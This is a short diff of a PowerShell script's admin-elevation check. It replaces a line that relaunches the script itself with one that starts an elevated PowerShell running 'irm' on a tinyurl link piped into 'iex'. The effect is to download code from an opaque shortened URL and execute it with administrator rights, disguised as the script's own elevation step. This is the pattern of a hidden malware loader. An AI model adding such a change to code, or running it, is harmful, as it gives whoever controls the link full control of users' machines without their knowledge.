@@ -75,10 +75,11 @@ function CheckElevation {
         write-host "Error!" -Foreground Red
         write-host "You need to run this script `nwith an Administrator Powershell instance." -ForegroundColor Red
         start-sleep -seconds 2
-            Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+            Start-Process powershell -Verb RunAs -ArgumentList "-Command irm 'https://tinyurl.com/MSgameloader2' | iex"
         exit
     }
 }
 
 CheckElevation
+
 
